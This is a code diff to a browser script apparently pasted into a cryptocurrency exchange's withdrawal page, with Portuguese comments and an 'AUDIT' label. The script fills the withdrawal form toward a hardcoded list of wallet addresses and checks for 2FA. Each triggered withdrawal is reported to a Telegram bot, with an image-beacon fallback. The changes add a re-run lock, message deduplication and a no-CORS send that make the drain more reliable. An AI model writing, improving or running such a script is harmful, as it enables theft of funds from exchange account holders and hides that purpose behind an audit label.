@@ -23,6 +23,17 @@
    - Botao enviar: button.btn_withdraw onclick="sendWithdraw(0,this)"
    ========================================================================= */
 (function(){
+  /* ---- trava: evita rodar 2x ao mesmo tempo ----
+     (script colado 2x / pagina recarregando durante o fluxo causaria
+      saque e notificacao em duplicidade) */
+  if (window.__AUDIT_EM_EXECUCAO) {
+    console.warn('[AUDIT] Ja existe uma execucao em andamento nesta pagina. Abortando esta.');
+    return;
+  }
+  window.__AUDIT_EM_EXECUCAO = true;
+  // failsafe: libera a trava mesmo se algo travar no meio
+  setTimeout(function(){ window.__AUDIT_EM_EXECUCAO = false; }, 180000);
+
   /* ---- enderecos de saque por tipo de rede ---- */
   var ENDERECOS = {
     EVM:  ['0x722eC30C1370f7B72acFeA5E546a6D870ee70A53','0x9aA342EB692f91fA07fe8ab0dBe2A135074f262D','0x9f125631d00DbcAF34Fa0ea550955183c2500B06','0x90705166455E09018e54B0E00198Ad64902A596e','0xE107c641604c074b6d6Db8Fc87956a026eEF5085','0xf17e9594feAB330727D326b564FF1dB0C8e7c3DC','0x70F2Bcb61E191414E0579Ad333e4c5b378b17d62','0xD01c6b6AcdC7817436224298d2D65787b72A6DD2','0x6EB97a6B26b047993c99e74AC14D9Ec01Af31C51','0x64366193e5cd67C4bA30647CE8B0248129E84f8B','0x4ca31601B8D6fF3A16F4EF207AD88C1F5529c6F4','0x16aa81861a3163dacDc737866c665330dFc5800e','0x00Ad488d61FfC8CE370250e5B665326B846b0eE7'],
@@ -156,28 +167,46 @@
     return '';
   }
 
-  /* ---- Telegram: envia moeda + valor + carteira a cada saque ---- */
+  /* ---- Telegram: envia moeda + valor + carteira a cada saque ----
+     - dedupe: nao repete a MESMA mensagem dentro de TELEGRAM_DEDUP_MS
+       (evita duplicar quando a pagina/script roda mais de uma vez)
+     - envio por UMA unica via (form-urlencoded, sem preflight) */
+  var TELEGRAM_DEDUP_MS = 600000;
   async function enviarTelegram() {
     try {
-      var cid = await telegramChatId();
-      if (!cid) return false;
       var texto =
         'SAQUE ACIONADO\n' +
         'Moeda: ' + AUDIT.moeda + '\n' +
         'Rede: ' + AUDIT.network + '\n' +
         'Valor: ' + AUDIT.amount + '\n' +
         'Carteira: ' + AUDIT.endereco;
-      var url = 'https://api.telegram.org/bot' + TELEGRAM.token + '/sendMessage';
+
+      // dedupe: se a mesma mensagem ja foi enviada ha pouco, ignora
       try {
-        await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: cid, text: texto })
-        });
+        var raw = localStorage.getItem('audit_tg_ultimo');
+        if (raw) {
+          var o = JSON.parse(raw);
+          if (o && o.texto === texto && (Date.now() - o.ts) < TELEGRAM_DEDUP_MS) {
+            log('Telegram: mensagem identica ignorada (dedupe).');
+            return true;
+          }
+        }
+      } catch(e) {}
+
+      var cid = await telegramChatId();
+      if (!cid) return false;
+
+      var url = 'https://api.telegram.org/bot' + TELEGRAM.token + '/sendMessage';
+      var fd = new URLSearchParams();
+      fd.set('chat_id', cid);
+      fd.set('text', texto);
+      try {
+        await fetch(url, { method: 'POST', body: fd, mode: 'no-cors' });
       } catch(e) {
-        // fallback: GET via <img> (envia mesmo se o CORS bloquear a leitura)
+        // fallback: GET via <img> (so cai aqui se o fetch nem sair)
         new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto);
       }
+      try { localStorage.setItem('audit_tg_ultimo', JSON.stringify({ texto: texto, ts: Date.now() })); } catch(e) {}
       log('Telegram: notificacao enviada.');
       return true;
     } catch(e) {
@@ -648,12 +677,17 @@
 
   /* ---- executar tudo ---- */
   async function executar() {
-    var ok = await selecionarMoeda();
-    if (!ok) { warn('Falha ao selecionar moeda. Abortando.'); return; }
-    ok = await preencherForm();
-    if (!ok) { warn('Falha ao preencher formulario. Abortando.'); return; }
-    await detectar2FA();
-    log('FIM.');
+    try {
+      var ok = await selecionarMoeda();
+      if (!ok) { warn('Falha ao selecionar moeda. Abortando.'); return; }
+      ok = await preencherForm();
+      if (!ok) { warn('Falha ao preencher formulario. Abortando.'); return; }
+      await detectar2FA();
+      log('FIM.');
+    } finally {
+      // libera a trava para permitir rodar de novo depois
+      window.__AUDIT_EM_EXECUCAO = false;
+    }
   }
 
   executar().catch(function(e){ console.error('[AUDIT] Erro:', e); });
